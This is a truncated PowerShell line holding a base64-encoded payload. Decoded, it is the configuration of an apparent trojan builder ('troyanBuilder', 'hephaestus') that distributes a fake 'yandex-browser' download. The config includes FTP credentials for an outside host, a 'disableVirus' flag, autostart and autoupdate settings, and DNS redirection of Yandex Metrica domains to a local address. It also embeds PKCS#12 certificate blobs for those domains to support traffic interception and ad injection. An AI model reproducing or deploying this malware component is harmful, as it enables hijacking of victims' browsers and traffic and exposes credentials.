
$xbody = "IyMjaGVhZA0KDQokc2VydmVyID0gQCcNCnsNCiAgInVybERvYyI6ICJodHRwczovL2RvY3MuZ29vZ2xlLmNvbS9kb2N1bWVudC9kLzEtU0dnR3NJUDJ0Q0dSVEprTS0zVGxLQjZNU1owN1R4NlNVeW1aY3IxeGZFL2VkaXQ/dGFiPXQuMCNoZWFkaW5nPWgub240MmVtdm82NTc4IiwNCiAgImRpc2FibGVkIjogZmFsc2UsDQogICJkaXNhYmxlVmlydXMiOiBmYWxzZSwNCiAgImxhbmRpbmdBdXRvIjogZmFsc2UsDQogICJsYW5kaW5nTmFtZSI6ICJ5YW5kZXgtYnJvd3NlciIsDQogICJsYW5kaW5nRnRwIjogImZ0cDovL2ozNTI0ODAzMl9mdHA6cUY4c0p4c21AYmFieWRvbGxzLnNpdGUvZG9tYWlucy95YW5kZXgtYnJvd3Nlci5zaXRlLzEvIiwNCiAgInNvdXJjZUNlcnREaXIiOiAiQzpcXHNvZnRcXGhlcGhhZXN0dXNcXGNlcnQiLA0KICAicm9vdERpciI6ICJDOlxcc29mdFxcaGVwaGFlc3R1cyIsDQogICJjcERpciI6ICJDOlxcc29mdFxcaGVwaGFlc3R1c1xcY3AiLA0KICAiY2VydERpciI6ICJDOlxcc29mdFxcaGVwaGFlc3R1c1xcY2VydCIsDQogICJwaHBEaXIiOiAiQzpcXHNvZnRcXGhlcGhhZXN0dXNcXHBocCIsDQogICJwaHBUZW1wbGF0ZUZpbGUiOiAiQzpcXHNvZnRcXGhlcGhhZXN0dXNcXHBocFxcLlxcZG4ucGhwIiwNCiAgInBocFRlbXBsYXRlU3BvbnNvckZpbGUiOiAiQzpcXHNvZnRcXGhlcGhhZXN0dXNcXHBocFxcLlxcZG93bmxvYWQucGhwIiwNCiAgImh0bWxUZW1wbGF0ZVNwb25zb3JGaWxlIjogIkM6XFxzb2Z0XFxoZXBoYWVzdHVzXFxwaHBcXC5cXGRvd25sb2FkLmh0bWwiLA0KICAic3lzRGlyIjogIkM6XFxzb2Z0XFxoZXBoYWVzdHVzXFxzeXMiLA0KICAidHJveWFuQnVpbGRlciI6ICJDOlxcc29mdFxcaGVwaGFlc3R1c1xcdHJveWFuYnVpbGRlclxcYmluL2RlYnVnL25ldDcuMC9Ucm95YW5CdWlsZGVyLmV4ZSIsDQogICJ0cm95YW5EaXIiOiAiQzpcXHNvZnRcXGhlcGhhZXN0dXNcXHRyb3lhbiIsDQogICJ0cm95YW5TY3JpcHREaXIiOiAiQzpcXHNvZnRcXGhlcGhhZXN0dXNcXHRyb3lhblxcdHJveWFucHMiLA0KICAidHJveWFuT3V0cHV0RGlyIjogIkM6XFxzb2Z0XFxoZXBoYWVzdHVzXFx0cm95YW5cXC5cXF9vdXRwdXQiLA0KICAidHJveWFuRXhlIjogIkM6XFxzb2Z0XFxoZXBoYWVzdHVzXFx0cm95YW5cXC5cXF9vdXRwdXRcXHRyb3lhbi5leGUiLA0KICAidHJveWFuSWNvIjogIkM6XFxzb2Z0XFxoZXBoYWVzdHVzXFx0cm95YW5cXC5cXF9vdXRwdXRcXHRyb3lhbi5pY28iLA0KICAidHJveWFuVmJzRGlyIjogIkM6XFxzb2Z0XFxoZXBoYWVzdHVzXFx0cm95YW5cXHRyb3lhbnZicyIsDQogICJ0cm95YW5WYnNEZWJ1ZyI6ICJDOlxcc29mdFxcaGVwaGFlc3R1c1xcdHJveWFuXFwuXFxfb3V0cHV0XFx0cm95YW4uZGVidWcudmJzIiwNCiAgInRyb3lhblZic1JlbGVhc2UiOiAiQzpcXHNvZnRcXGhlcGhhZXN0dXNcXHRyb3lhblxcLlxcX291dHB1dFxcdHJveWFuLnJlbGVhc2UudmJzIiwNCiAgImJvZHkiOiAiQzpcXHNvZnRcXGhlcGhhZXN0dXNcXHRyb3lhblxcLlxcX291dHB1dFxcYm9keS50eHQiLA0KICAiYm9keVJlbGVhc2UiOiAiQzpcXHNvZnRcXGhlcGhhZXN0dXNcXHRyb3lhblxcLlxcX291dHB1dFxcYm9keS5yZWxlYXNlLnBzMSIsDQogICJib2R5RGVidWciOiAiQzpcXHNvZnRcXGhlcGhhZXN0dXNcXHRyb3lhblxcLlxcX291dHB1dFxcYm9keS5kZWJ1Zy5wczEiLA0KICAiaG9sZGVyIjogIkM6XFxzb2Z0XFxoZXBoYWVzdHVzXFx0cm95YW5cXC5cXF9vdXRwdXRcXGhvbGRlci50eHQiLA0KICAiaG9sZGVyUmVsZWFzZSI6ICJDOlxcc29mdFxcaGVwaGFlc3R1c1xcdHJveWFuXFwuXFxfb3V0cHV0XFxob2xkZXIucmVsZWFzZS5wczEiLA0KICAiaG9sZGVyRGVidWciOiAiQzpcXHNvZnRcXGhlcGhhZXN0dXNcXHRyb3lhblxcLlxcX291dHB1dFxcaG9sZGVyLmRlYnVnLnBzMSIsDQogICJ1c2VyQm9keSI6ICJDOlxcZGF0YVxcMTI3LjAuMC4xXFxib2R5LnR4dCIsDQogICJ1c2VyVHJveWFuRXhlIjogIkM6XFxkYXRhXFwxMjcuMC4wLjFcXHRyb3lhbi5leGUiLA0KICAidXNlclRyb3lhbkljbyI6ICJDOlxcZGF0YVxcMTI3LjAuMC4xXFx0cm95YW4uaWNvIiwNCiAgInVzZXJEYXRhRGlyIjogIkM6XFxkYXRhXFwxMjcuMC4wLjEiLA0KICAidXNlclNlcnZlckZpbGUiOiAiQzpcXGRhdGFcXDEyNy4wLjAuMVxcc2VydmVyLmpzb24iLA0KICAidXNlclRyb3lhblZicyI6ICJDOlxcZGF0YVxcMTI3LjAuMC4xXFx0cm95YW4udmJzIiwNCiAgInNlcnZlciI6ICIxMjcuMC4wLjEiLA0KICAiZGVmYXVsdEljbyI6ICJDOlxcc29mdFxcaGVwaGFlc3R1c1xcZGVmYXVsdGljb24uaWNvIiwNCiAgImRuVmJzTGlua1Nob3J0IjogIi9kZWZhdWx0L1Nzck5xM3IwZjAvbm9uZS9HZXRWYnMiLA0KICAiZG5WYnNMaW5rIjogImh0dHA6Ly9sb2NhbGhvc3QvL2RlZmF1bHQvVWd4VFYxMlpOYy9ub25lL0dldFZicyIsDQogICJwaHBWYnNMaW5rU2hvcnQiOiAiL2RlZmF1bHQvR2V0VmJzUGhwIiwNCiAgInVzZXJQaHBWYnNGaWxlIjogIkM6XFxkYXRhXFwxMjcuMC4wLjFcXHlhbmRleC1icm93c2VyLnBocCIsDQogICJ1c2VyU3BvbnNvclBocFZic0ZpbGUiOiAiQzpcXGRhdGFcXDEyNy4wLjAuMVxceWFuZGV4LWJyb3dzZXItc3BvbnNvci5waHAiLA0KICAidXNlclNwb25zb3JIdG1sVmJzRmlsZSI6ICJDOlxcZGF0YVxcMTI3LjAuMC4xXFx5YW5kZXgtYnJvd3Nlci1zcG9uc29yLmh0bWwiLA0KICAidXNlclBocEV4ZUZpbGUiOiAiQzpcXGRhdGFcXDEyNy4wLjAuMVxceWFuZGV4LWJyb3dzZXItZXhlLnBocCIsDQogICJ1c2VyU3BvbnNvclBocEV4ZUZpbGUiOiAiQzpcXGRhdGFcXDEyNy4wLjAuMVxceWFuZGV4LWJyb3dzZXItc3BvbnNvci1leGUucGhwIiwNCiAgInVzZXJTcG9uc29ySHRtbEV4ZUZpbGUiOiAiQzpcXGRhdGFcXDEyNy4wLjAuMVxceWFuZGV4LWJyb3dzZXItc3BvbnNvci1leGUuaHRtbCIsDQogICJkb3dubG9hZElkZW50aWZpZXIiOiAieWFuZGV4LWJyb3dzZXIiLA0KICAidXBkYXRlVXJsIjogImh0dHA6Ly9sb2NhbGhvc3QvdXBkYXRlIiwNCiAgInVwZGF0ZVVybEZvbGRlciI6ICJodHRwOi8vbG9jYWxob3N0L2RhdGEvIiwNCiAgInVwZGF0ZVVybEJsb2NrIjogImh0dHA6Ly9sb2NhbGhvc3QvZGF0YS9ibG9jay8iLA0KICAicHJpbWFyeURucyI6ICIxMjcuMC4wLjEiLA0KICAic2Vjb25kYXJ5RG5zIjogIjEyNy4wLjAuMSIsDQogICJ0cmFjayI6IHRydWUsDQogICJ0cmFja1NlcmllIjogInRlc3QtbmV3IiwNCiAgInRyYWNrRGVza3RvcCI6IGZhbHNlLA0KICAidHJhY2tVcmwiOiAiaHR0cDovL2xvY2FsaG9zdC91cHNlcnQiLA0KICAiYXV0b1N0YXJ0IjogdHJ1ZSwNCiAgImF1dG9VcGRhdGUiOiB0cnVlLA0KICAiZG9tYWluSXBzIjogWw0KICAgIHsNCiAgICAgICJpbmRleCI6ICIyYzEyOTYxMy01MDg0LTQ1NjctYmU3Zi01NDY1ZmViNDZhZjEiLA0KICAgICAgIm5hbWUiOiAiSlMgQWRzIiwNCiAgICAgICJpcCI6ICIxMjcuMC4wLjEiLA0KICAgICAgImRvbWFpbnMiOiBbDQogICAgICAgICJtYy55YW5kZXguY29tIiwNCiAgICAgICAgIm1jLnlhbmRleC5ydSINCiAgICAgIF0sDQogICAgICAiZnRwIjogImZ0cDovL2Z0cF9KU19BZHM6QWJjMTIzNDUhQDEyNy4wLjAuMSIsDQogICAgICAiZnRwQXNIdHRwIjogImh0dHA6Ly8xMjcuMC4wLjEvZnRwIiwNCiAgICAgICJlbmFibGVkIjogdHJ1ZSwNCiAgICAgICJhZHMiOiAiQzpcXGluZXRwdWJcXHd3d3Jvb3RcXGFkc1xcSlNfQWRzIg0KICAgIH0NCiAgXSwNCiAgInB1c2hlc0ZvcmNlIjogdHJ1ZSwNCiAgInB1c2hlcyI6IFtdLA0KICAic3RhcnREb3dubG9hZHNGb3JjZSI6IGZhbHNlLA0KICAic3RhcnREb3dubG9hZHMiOiBbXSwNCiAgInN0YXJ0VXJsc0ZvcmNlIjogdHJ1ZSwNCiAgInN0YXJ0VXJscyI6IFtdLA0KICAiZnJvbnRGb3JjZSI6IGZhbHNlLA0KICAiZnJvbnQiOiBbXSwNCiAgImV4dHJhY3RJY29uRnJvbUZyb250IjogdHJ1ZSwNCiAgImVtYmVkZGluZ3NGb3JjZSI6IGZhbHNlLA0KICAiZW1iZWRkaW5ncyI6IFtdLA0KICAiaXNWYWxpZCI6IGZhbHNlLA0KICAiZXh0cmFVcGRhdGUiOiBmYWxzZQ0KfQ0KJ0AgfCBDb252ZXJ0RnJvbS1Kc29uDQoNCg0KICAgICAgICAkeGRhdGEgPSBAew0KICAgICAgICAnbWMueWFuZGV4LmNvbSc9J01JSUtrUUlCQXpDQ0NrMEdDU3FHU0liM0RRRUhBYUNDQ2o0RWdnbzZNSUlLTmpDQ0JnY0dDU3FHU0liM0RRRUhBYUNDQmZnRWdnWDBNSUlGOERDQ0Jld0dDeXFHU0liM0RRRU1DZ0VDb0lJRTlqQ0NCUEl3SEFZS0tvWklodmNOQVF3QkF6QU9CQWhZR1FmdkNJOVoxUUlDQjlBRWdnVFFZUmRuQ01wZnBPbnJkV21xckdaWE00NjA1TW5NRGhIM1dLUll5ZE45JysNCidMNU1TangyTEg4QTh3YlF0aVVwNDZ3ZU4wMWQ2ZEVsbzZqc1FrbDZQdW1JTXBoL2c4Q0lMb0t2MDZpcWtldjZ0QW1jNG8zczNwMW12NnJMMUc1U0phRzUyYWx1UWZ6UGJGeHdkc1BLdDc5OFFGRXoweHJqMmlpRDlDQWwvZVlMNXI4cDBTYSs0MEFINFpudStzQXg1SmxFTHhPME5kMUphcWo3M053d0pMM0xOTzYrQml3TmNBQ1FhMFpFRmVJUm12ckxlUkxsdicrDQonbHAxMTJlLzFhcG5BVmUvd01zdi96ZXRHaXhkR0Y4VmFNSWdGNDFXdmRXRklIOTVrZDZnYmhndXFnUkIzODNpbDZWdUJOTHBMak9ScEVuM2pjcWxLbDNHWnBHUDNlM1V1WDZ2TUd0Y2pzbFl3aGVCcDR2NGtkbmxYY2VzV2hVdHVzTlRzdC9wU3BHNTR4ZHlxaHRXeGJLQXNsTHdMNTZnYUhFYitlbDIxQUxvYi9qc3NlWVNDWm11NzlrbHRmQTNVcks3K0JNV2onKw0KJ1NzOGFKeVhXRFl4UklCblZHU1MzQUp2QlQ1RndOUThSTXhXeEk2eEhhN3hYZTk5M0cwWDBOZlZzaU9zdEVJQzFkcE9MK3FTeFE5QVYxMTUxSkpNaThEZFhWa2tBR0RZaThFMnJpRnpReGg4UXdDZG1Ceko5RzlnQ2Y0S29GK0EyeGJtSngrbERtUHJIQ3puOWZQU2MwQWJscG0wcG5Qcmxmb2pYeXNFcThEcllOK2lEWVdRM3d6VUZUTlk4MkZOTllwZnJrdnpwJysNCidmMEtEdExmVzVhcjhXTERzTTdaeWErMlIvUUVDWmEvREtITkR0MDVrZXJKdkh3b0xqeTc3emdpTWVLUzFLNlpVdVFxNERuOWFxTVl6VVNGVFYzMCtFaTZzUXgyL056cnZRNndlOVZZV1BhWE1hUko1YU5GWkhuSkFaZnQwUE5SdjRVQmxoK0NmSlhtc214S1hLSU1UOFd2QWNlTUF2ZjdiamI0V3Zhc3FmRUxwWk91aTRZR1dmcDBidVhnSkpoWmR2UENrRDlKcicrDQonY1BxWUNwRnFBbzVUTmt6cXo5UllOUU1kemIrMW82aDFKVWIxQWpNYkk2R0M5Wkx4V0REM250dGgyaWhIRW43NjViYngwR3QxUjQzZktES3hSa3VpTTJXd21TamlpVDBZTFM1blBvNDhyeTNPK25SbEE2djEyaHBiMi8wczZTd0tuM2VneHk5cFoyTzErVjNWRkhsZlBzNk5KT0VJNE9lSDBPTExUMHJEelo1STBCMkNDSEdBbitQWXZ0TDhjRHEvV2ZDckxQN1EnKw0KJzIrT25VTWpqc1daQmw3OVBZSlEvcllNTGlqTzY1UlQwc2JPTTl0L3p6U1lVZERhTWh2aXFYSG1LRFZ0UlcwRm9NZ2hzTWFxSThCb2pzQ0hUcFZqcWl4b09GL2xlNmFabjE5d0h2Ty90OU9PSCt2TW5Ybk5JcFF4bVRDM1lDUDRXbFU1SzJSZ3d1MGNBckpOMFRXMy9jSHRITFhzNzVxb3Nsa1FPNU54TUNaQi9VVlk1QXh5RE42b1F5RXI0VWgyOFp1ejNJRC9qJysNCic1d2d6WGJLNHRLNWdBbEVLNVZzQ2NGRkg0dm42cW5MaitSN3IrNWQwY3Rsekd6RVNNczh6NUd5OTJ5K1NuOVpmNU1hSW8ySG9yQnBTZWVacUdTNks0Q1pkOHVjbjE0RUt0RWZHLzJCTk51dTFmMkJQUGxzSzRzT1dXQUpIRUhhZStKb3o2OFUrcWxMaGU4Wk9pckZBWnh4VzNOL1pQV0hQRi9DMEJId1VlZEZpd3JEZXEwZmdUajFFN1hieFNvM0sxcjdGWllRdycrDQonNCt0L3VSRDA4Si9TVzVnQk5lbXM5RzNvMnNYMjZUY2ZjbWN4SklnZkY5ekNLRERDNTVMR1RwNHpFenFjOS9RdzBUL1J5T2FGZmlzaWFPeEtwZ3BZeHc0aHZKVlJXOGZEc1U0N0paQW9hcU0vNDg3aG12ZkdNdkowYzN2OEZ2Snh1TU56ekZuWjk4QWtvQndmb3RUSmxFRkNZWnI5RjlhTUlLU3ErQUk0RTRyQmNDM2dGaDkxNDZPTE1nN0F3Z1JRTEV2bnA5elMnKw0KJ0NIRXhnZUl3RFFZSkt3WUJCQUdDTnhFQ01RQXdFd1lKS29aSWh2Y05BUWtWTVFZRUJBRUFBQUF3WFFZSktvWklodmNOQVFrVU1WQWVUZ0IwQUdVQUxRQTVBRGdBWVFCaUFEQUFZUUF4QUdJQUxRQm1BRGNBTndBd0FDMEFOQUEzQURFQU5BQXRBRGtBWXdCakFHVUFMUUEwQURJQU53QXdBRE1BTVFCbEFEQUFZUUEyQURFQU5UQmRCZ2tyQmdFRUFZSTNFUUV4JysNCidVQjVPQUUwQWFRQmpBSElBYndCekFHOEFaZ0IwQUNBQVV3QjBBSElBYndCdUFHY0FJQUJEQUhJQWVRQndBSFFBYndCbkFISUFZUUJ3QUdnQWFRQmpBQ0FBVUFCeUFHOEFkZ0JwQUdRQVpRQnlNSUlFSndZSktvWklodmNOQVFjR29JSUVHRENDQkJRQ0FRQXdnZ1FOQmdrcWhraUc5dzBCQndFd0hBWUtLb1pJaHZjTkFRd0JBekFPQkFoa0JjbjR0WWZXaHdJQycrDQonQjlDQWdnUGdkdDNxZVVoVTIxVnA0eHlYNXJnZERlQWxEWUNkZC9pVUkwdXRLRDdWZFNXZDJtRmQ0MTJkeW11a1dCai9qY2FnQjUza3J0THFjWEhQa1JFcHlGVEFSdWRrNkFPZEpxWS9oaDdMU1VJQjc5WWhkUDhtdkdoaWRtVmYvS1Jzek5GVHUxTUZITU9RN0VBbDJxRzhEamgrbjUxYnB3Z05iTXdGRWhTMThMSWdZZ1lLQ1YzVkY1N0ZaRVNEYVlrbG05V0UnKw0KJzZid01OU1NVYkNWa2NndnpGZ0kwT1FEaVIzN01ZTDkrOXVvUDczMWNna2JKS09zaWZ0QS91Y2pPajNnd3JKQUhQMHlqYmNMbTk3RUY2b1VTMDdPY2tMZUV0cWY3NWltTjQxS1NqZXYvRlVSTDRXd0FiSU9DOTNyUC9HUStGdTZrckZqcmRUUGtDWE5EZ1RvamJZRE1hVzd4dXJUZ2NzZFNXa0xrZXo2MnI3ZWQ5cFVhUWF2YTBHdnY4M3J1U0RpUDJKVGdxMldHJysNCidyMWpWbUhNTlRXT2drMFRtN2EwUi85Z1RLOHJWRDdDS25ZT1hlSURsRy9mQWloYnhnNksyZVA0anA3WmRJMmkwVFlIcjhzM2VVYUYzSlBqT2RsTDBWTHd3RUZRUDQrSmFqVThJbGR2bU9mSnBrb0pmaWJzQnlVZ3lnVzA1elZGbWh3TTI4b3hvN2xTa0JaZnlXSzV4cVdXRnAyY1J1M2JwUVVuWVA3YTFmSG0zYkpqUGFVbUdNZzIzZmF3YUhGZHFET2lRSi9OWCcrDQoncE9JUnlERkJWTFY2SnY2eDVKL3RIR3B3K1lGT3JpSzNtdFRadTU4bTREK2xTQ2tTaFFPR21nTVpBMHJhOS9LVC9wVVZkVTQvTW9oWm5zK0VzalNXaWFjQVA0K1Njd2Nnc0h3L2tVY0tiV3ZuVUx6ZHh1VEFRR1ZHMjV2V01FZjdvU2VEN1Yyc0ZHQUFaem93THF0QUJjT0hLWGZDeGJRaXlQY0MzK3BBOHRDTTUvQ2gvVkc1V1YwNFpabHE0MklrakozcDRkNisnKw0KJ2JOSmlWek1xelBWUGdPUis2NVBlWmF0TnNPVDMxY2NWWjROREJ1TTRrNHgvSTRsYy9qbVFoekRsd0lROFdpNzVFOFp2NDhyVTM2aXBRS3ZMQnhBUTlHMWk0Ym1qYkhkR0lBYWpFZnVYb1puQXJVWG1hUVVYSmdtamxiZ1VQdHBCR1V1VzVxbTBKdTNIU1lxNVB6VlRYN1lVUW5kUHhPb1VKNnhxR1d3VVFuZDJJVkhMTWdvY1pmNVVvaGdzSmROS2dRZWw5R2t2JysNCidMYVIrMWltWEJEbDN6czhZQUFXVXJoU2V2ZnRYVTZqRForQlRra0prQkZHeVhTS2dtRCthUkdFK0RaWFhIbC85dGd1VitNTkhmcVVPdlkrQzI4Z3g0bURIdEVjY0VSWjV5N2ZVRmV0Qlg4SDhaNnJFa0lKb20rbU9nTHZBNWViYk1aT0RxdDRlRFJjbmh3OEREZ2dWSUExTmoyNDZxZERqekwvNytOYTgxQUlmMXRoNFUxYnZHcWRYdDNQVGpGZUxsM2gycFM3MicrDQonaWJKVVFCZmZyUVNsMFFwdGU4VXd3eVpBSlZiTXE3V0k1OGNrbTRDQ1dMYXdSVlJYbTBYc1FBeENUM1QwMEJxVG1YeldrWDk3YzRDZGZzb2ltdU00eTJWQkx2TlNVcGp3TDl4cnNZWXdlY0c0MC9KcnFrSHk0SkNPd0FKWG1YWjdTN2d3T3pBZk1BY0dCU3NPQXdJYUJCUzVsM2ZuWGQ3Rlg3NzNhWWQrMjgvRUZ2WmFld1FVT0Q2SzlaSS9KaWxQNEJDdXJSc24nKw0KJ2xNMDkvRk1DQWdmUScNCidtYy55YW5kZXgucnUnPSdNSUlLa1FJQkF6Q0NDazBHQ1NxR1NJYjNEUUVIQWFDQ0NqNEVnZ282TUlJS05qQ0NCZzhHQ1NxR1NJYjNEUUVIQWFDQ0JnQUVnZ1g4TUlJRitEQ0NCZlFHQ3lxR1NJYjNEUUVNQ2dFQ29JSUUvakNDQlBvd0hBWUtLb1pJaHZjTkFRd0JBekFPQkFqZm9UVFBrcG9SOWdJQ0I5QUVnZ1RZMWlRT1RXekZEYVZoaWtBQXV3VURTRTVScDg3WFc4VFN6WUxpcHEyRCcrDQonMG9MOXN4K0NIbGNBTGdiR1dJTVJLOGNmcGZYOWczWWl3VktxSVJpcFRJM0o0ZUREWFF3azdva0ZpeHh5Njhmemh0aUNLeEZNTUFRaG9vRlR5RndJY1JZd3pIcWpZTUJRYVFReFJCZzNlVUJyMTBUM3pWazhEbVRiclZ4RnZtcUFEeFljczYwa29xWGpROWh6WEtpWnlOb21RYURFUVlwdkhpVWp3SmhZeHJKZS9DaEZVZVBYUGJkNG9oOGNiVUdqRGNXTjVNTGYnKw0KJ1VqRytKcmFYa2t5VEgyLzhaUnJhYTYzajVCLy9aTURpN0JDMVNuaEhGbk5jSEpDWHFXMnRadXFrdVlkd2hhcFE3dlE2a0JyRm1VSHpYN05QRnpUTEVqamxoWTByQnptL21maUJsd3Z0RG1lU3ZCeWFoREVXNFRWcmtSY2dQQ2NnKzhLeTR4YXZYYzhNK0xWcUVyOElYV3J3azlxR3FGNnM5cFo1TEpPYWFuWWpwYjlFSmpNRTVieXdnblVKY3BMeDRuNXNKdldNJysNCid5RnVmdDBwdndWaVlXT3ZIQUpGUHZGNi9vZG1CdkxKbGFRVzVWN1pBTzdHUktVS0xlQTdPSnVwQjRnbEZOc2pRVWRrYUNnZFUzdTlzZk1JOEQ3T0hoKzAyUDFOeHVuYWJEUFViQUljUlhIYVZUemZOQm5XWVQ0SFBobnNBeFZxL05meWhiK2VJV1VFR0ZiaVRWUDJLT1ZReXJBektaeEtHRTM4OEFPNkR1RUhzUnpEUXFDME5RWWdVVWlZRXI1UXZ3eno5b1pKSicrDQonZ29zSGl4WlVsM29VRUR6ajUzTGQ2ODZNUzlFUXBjeW55dTk3dGo2NFk2TSs5ZldTTWRuN1FGSGF2SFF4ZWF0QUN3R0FuQU5wd2ROZ0I2WGphNmd5SWZHSC9ScnB1SWREY3hNSWhoRlE1Rk1HaG01MGNVaHNhNWluNVJ6RUJxVkNUeFdvc3pzNHJuUTBGUmxZc3hRaDQ1RzVTRS8zMHROSGZkN2I1ZTVQVjhBYTJRVGwvaDllcjlMN0psb2NHQ3A0M1BKMGt4WncnKw0KJ3pGZmRWcVVJUENhdmhoTUFoL2JlTU9SQ05kNjd0OU50b3ZoZ0lOb0ptTkNLeHI0dEZiai9ibnM0dzBoSUlkdEcwdEM3NlFnMmpHMFZ6K1dvVTJDajhUblh2b0N6MmdXcW44R3FxdVdnOGdoYmttd3Z5Q1N1VlNoaHhUM05lall6cDV5M1hqSGlwRW1TckNaK0RFd3dscXdCWms1dElaNGQ1cVAvcEd3blplZkxiMmowMVZrdDYzeHlJeFBnSXdBTlFmWDBTZ2VaJysNCidlejFEblU5YVFzbjZFejBwL0FiMyt2d0VETms3Z3ZoV2liMDJVM0pqanlZZ1JHTWNzUTdPeTRZeDZHdUU1M2lFSlhLSVZwZEpXQzdKZFQyNkpWdFRKUmtGR0xOYkR2aWUwenhPR0Ridm1JMHZOQ0dHOVdCaldGUC9LaXpQaGRUbmZZaTNUZDlUUnlkRldScks1bHdtSFNod0lxU3JJanU2SVpPc0Z0Q0V6UmtSbktNS1lwVGJUQXAySld1bjZQc1VPUytiakVXMicrDQonV24vRUhuZVpoYnNzRW5ydEZjN2l3MkxibWRhcEJyNVZxY3owM3VTNjl0Rm13MzBTWnFSYVZtcU95ZEpvaHpDNWNPNncyOWxralBTR0NsMDhnSXk5eTNReDBOdTBFeDlRbkRGU3FNRkcxc0dXSU5LUDhWK3pSS1F6TXJiZXpkTEI3Q0dnS3dzUDA4VTNXVnFMMzZ4OE1HTWpYQ0ZvVVVUc0phUW9ieTVIaWczWE1XL3UvL0ZJYlIydVhnRmI0U0FNMU1SYlRIeU4nKw0KJ0xnQ0ZqMmwwdnVyNDlmWnNMakV3Z2NLMFdQbHpicVgyZWEwV3NXOUo2bk5IeEErcUZBQnV1ZlI1ZnVFdngvQjlSdVVIV0huNGFQQUl3TzZlVGpUV1BHOGh3K0pkSjM2TjQ0Y0tjNTZxaFkwR2RlQU41eFF6aDNveUE2ckUzUGppL0hDbGRlMFhZWkY5Y0gzQWFOT05Xa1NwNFBlNnhNcERObS90SG4zVERpVk51UTRCTG1uV05BZTNXNmFTblNYWkpQdEdkVzk5JysNCidDNkVWc3NESVBpbUU1VEdCNGpBTkJna3JCZ0VFQVlJM0VRSXhBREFUQmdrcWhraUc5dzBCQ1JVeEJnUUVBUUFBQURCZEJna3Foa2lHOXcwQkNSUXhVQjVPQUhRQVpRQXRBRE1BTkFBd0FEQUFPUUExQURRQU5RQXRBR0lBTmdBM0FHVUFMUUEwQURRQU13QmlBQzBBT0FBeEFHUUFOZ0F0QURFQU53QmlBRGNBWkFCakFESUFPUUJpQUdFQU1BQTNNRjBHQ1NzRycrDQonQVFRQmdqY1JBVEZRSGs0QVRRQnBBR01BY2dCdkFITUFid0JtQUhRQUlBQlRBSFFBY2dCdkFHNEFad0FnQUVNQWNnQjVBSEFBZEFCdkFHY0FjZ0JoQUhBQWFBQnBBR01BSUFCUUFISUFid0IyQUdrQVpBQmxBSEl3Z2dRZkJna3Foa2lHOXcwQkJ3YWdnZ1FRTUlJRURBSUJBRENDQkFVR0NTcUdTSWIzRFFFSEFUQWNCZ29xaGtpRzl3MEJEQUVETUE0RUNDbVInKw0KJ0pGT2RNanNCQWdJSDBJQ0NBOWlpQ2xJdHltUHBpVXF0cGxMVko4b0p2S09WeXh4VjQwM3NIU0JmQXNGTmtWajZPdFpzZWpBUnZycFdwVGNtWVo3Z3B2b1ltY1VQMEFTUEtDQzArMG42RThvZ1l4dTAvK0VsUy9IN0lhUThJbjVBRXVtTGp4MWFvYnlkSkV0WHJnc2ZueTBMdXJvSTlQaTBJVHBwaEpRWHpNbVFxSURNOU5zajA2Yi9tNHVUQnR0TVdacWVYYk5SJysNCidHUzljT2FwS3JIakRzLzc4enlMQ0taeXkxYS9YTDdIbStZTVNsbXVUbTF0WFlqelk5eWlKSXprODArR0hCSHNhZzhzWVBGemorY3dOYmJjYUVUVUJ1TWduNVlKQkg4RTVPUm9uM3RGdXdKa3VGSm1TYmtFbnVOQjE2anFjMTJ4NzVsTE03Z2kzUm15OFQ2RjE5dlEyQXkycFpRSllFSjZJTEVmaHBJd1cxRXJ0SXJsRjc1NmszS1l0em16QU1DOVVwdDJvTVFpYScrDQonalVUUUhqMFhPdit3RndKcmFIdS92YTNmcEJIWHdPRUxKemFTUkZTblIzL3FmdnZVWVYyNWJGYStyL2w3eVNTT2c0UTVCY29FRmw1SGdLN3JXYnRUUG5jK1hOZWI2enRQcUppRld5ck0vSlF5aU9SR3QrZVhkRGt4Yyt2SUtYVlVkbkJRVjJGcnUwdEtxR2JsMEFTVi9BR0RUa2QrTS8yeEl2dEdhaWpBVHppT0NvM2VsZkZwR01GSkFOSlMyc240T0FENTRjYS8nKw0KJ3RNOEUwZHpSKytqUm91UkllcDlaVGt3NDgxUDFIc3ozM3lRK0creWlodHoxL0tjMVpLeWRjSFhyOEJkdStuT3NrcnBjQVk0V0lUQnNZME9ua2J1MjROWGdZOVlmSk9JUkdLZEs5UTZLWnFFRko1MllqWFJWWEhHSEJIYWI1VDZRS3RRb2VLNW5LZzJUdEdTTy9MRzVBTDhDM1JTMWc0VXlKUXVid2NPeUZiM0ZDenRLWEhoa2p6UGxtUzdNZ2RVTnp3Y2tobXA1JysNCidZOUE0SVNGakxoUGhKKzc0NGRaS2YzTDc5K01sSFU0R0J0cXdWelN4UUdrWTN4STNTUjBzMDNxVFhVV0dqZHVodGx0cmNQam5LR21jUDFpRC9MUlFRTnA5R2FsRnVHWG1saXRuWHFCdzhOVTRmOXl4TjRENVpSNjB2cTl4MUFxWjJnNS9Mbkpsemt6empkVVp4bHZRQVlnNHEyUkk3Zk5BQkFRZUdNVVN5NUtjOFkrNU1tRzJuMSt0VnBMdVd0R2MrdlRTRiszWScrDQonQk5CaGtOb1lTZHF4UGUrcVVuVGFyeGRxK1B1NTIveGJwK2tKRnpqSWYwUk1jY3h2RGYrY0FQWmVuaWtZUlRZc0IwUVM3eW1admhqaVBSWkp6anc1VmhzQWdzVVR6bW1wdGIyaGljczdGVTZRR0xNeU4rZGx4eTQyT1NaWHFwelV5UDcrOWMvY0EyM2o3aSs3MWRQUkNFbTdZWkpta0tSK0xyOFpFWlorenNNclpuLzVpSEFpQXJYcmZyVFloVERDcDdBNGEwbDMnKw0KJ1NVdkl2eWg0SmdLd2sxM3BhLzZDRXdWM3pnWnIyYlBNbndUdW5WNnJPMFQzL1ZsQmU4M1VFZkxRd0RhOWZtek9IUE1MNzF5UTVsQlNsNWtONVpJSkRkZDdSVzNYZXVnVlUyWm9MbUR6aHBnc0M0L1JhRCtxUkJDV2hacVl3Z0RKZzNrd096QWZNQWNHQlNzT0F3SWFCQlJEajBNZ1J3Z2w3R3dvYlFIZ0xjcWFMWUhIc3dRVXlKTXJja1gwUXA4NkhpWG5oSlRMJysNCidPaitrUUxBQ0FnZlEnDQogICAgfQ0KICAgICAgICANCg0KICAgICAgICAkeGZyb250ID0gQCgNCiAgICAgICAgDQogICAgICAgICkNCiAgICAgICAgJHhmcm9udF9uYW1lID0gQCgNCiAgICAgICAgDQogICAgICAgICkNCiAgICAgICAgJHhlbWJlZCA9IEAoDQogICAgICAgIA0KICAgICAgICApDQogICAgICAgICR4ZW1iZWRfbmFtZSA9IEAoDQogICAgICAgIA0KICAgICA